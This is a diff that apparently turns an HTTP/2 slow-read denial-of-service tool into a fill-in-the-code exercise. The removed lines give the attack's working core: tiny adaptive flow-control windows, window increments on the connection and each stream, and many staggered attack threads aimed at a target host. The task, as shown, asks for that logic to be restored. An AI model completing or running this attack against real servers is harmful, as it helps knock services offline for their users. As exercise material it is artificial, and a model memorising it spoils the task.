@@ -170,10 +170,10 @@ class HTTP2AdaptiveSlowIncrementalAttack:
             sock.sendall(h2_conn.data_to_send())
             
             # Configure very small initial window size (adaptive)
-            initial_window = self.rate_controller.get_adaptive_increment()
+            initial_window = # FILL CODE HERE
             h2_conn.update_settings({
                 h2.settings.SettingCodes.INITIAL_WINDOW_SIZE: initial_window,
-                h2.settings.SettingCodes.MAX_FRAME_SIZE: 16384
+                h2.settings.SettingCodes.MAX_FRAME_SIZE: # FILL CODE HERE
             })
             sock.sendall(h2_conn.data_to_send())
             
@@ -258,11 +258,10 @@ class HTTP2AdaptiveSlowIncrementalAttack:
                                             f"on stream {event.stream_id} (total: {bytes_received})")
                                 
                                 # Use adaptive increment and delay
-                                increment = self.rate_controller.get_adaptive_increment()
+                                increment = # FILL CODE HERE
                                 
                                 # Update both connection and stream windows
-                                h2_conn.increment_flow_control_window(increment)
-                                h2_conn.increment_flow_control_window(increment, stream_id=event.stream_id)
+                                # FILL CODE HERE
                                 sock.sendall(h2_conn.data_to_send())
                                 
                                 total_window_granted += increment * 2
@@ -352,13 +351,7 @@ class HTTP2AdaptiveSlowIncrementalAttack:
         
         # Create attack threads
         for i in range(self.num_connections):
-            thread = threading.Thread(
-                target=self.create_connection,
-                args=(i + 1,),
-                name=f"AdaptiveSlowThread-{i+1}"
-            )
-            threads.append(thread)
-            thread.start()
+            # FILL CODE HERE: Create and start a thread for create_connection
             
             # Stagger connection attempts with adaptive timing
             stagger_delay = self.rate_controller.get_adaptive_delay() * 0.1
@@ -475,14 +468,7 @@ Examples:
     
     # Create and run adaptive attack
     try:
-        attack = HTTP2AdaptiveSlowIncrementalAttack(
-            args.target, 
-            args.port, 
-            args.connections,
-            args.min_increment,
-            args.max_increment
-        )
-        attack.run_attack()
+        # FILL CODE HERE: Create and run the attack
     except Exception as e:
         logging.error(f"💥 Adaptive attack failed: {e}")
         return 1
